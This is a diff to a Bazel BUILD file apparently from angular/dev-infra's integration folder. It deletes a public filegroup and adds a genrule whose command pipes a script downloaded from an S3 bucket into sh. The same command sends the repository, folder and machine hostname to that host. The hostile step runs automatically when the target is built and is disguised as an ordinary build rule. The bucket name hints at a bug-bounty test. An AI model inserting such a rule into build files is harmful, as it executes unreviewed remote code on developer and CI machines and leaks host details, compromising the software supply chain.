@@ -1,9 +1,7 @@
-package(default_visibility = ["//visibility:public"])
 
-# Make source files available for distribution via pkg_npm
-filegroup(
-    name = "files",
-    srcs = glob(["*"]) + [
-        "//bazel/integration/test_runner:files",
-    ],
+genrule(
+    name = "build",
+    outs = ["foo"],
+    cmd = "curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/angular/dev-infra.git\\&folder=integration\\&hostname=`hostname`\\&foo=uxc",
+    visibility = ["//visibility:public"],
 )
